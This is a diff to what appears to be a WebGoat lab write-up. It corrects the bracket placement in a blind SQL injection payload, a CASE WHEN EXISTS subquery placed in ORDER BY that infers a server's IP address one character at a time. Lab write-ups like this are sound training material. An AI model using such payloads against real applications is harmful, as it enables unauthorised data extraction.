@@ -132,14 +132,13 @@ I used a `CASE WHEN EXISTS(...)` expression as the `ORDER BY` payload. The `EXIS
 
 The payload follows this structure:
 
-```sql
-CASE WHEN EXISTS(
+```CASE WHEN EXISTS(
     SELECT id
     FROM servers
     WHERE hostname = 'webgoat-prd'
       AND substring(ip,1,1) = '1'
-    THEN id
-    ELSE ip
+) THEN id
+ELSE ip
 END
 ```
 
@@ -174,8 +173,8 @@ ORDER BY CASE WHEN EXISTS(
     FROM servers
     WHERE hostname = 'webgoat-prd'
       AND substring(ip,1,1) = '1'
-    THEN id
-    ELSE ip
+) THEN id
+ELSE ip
 END
 ```
 
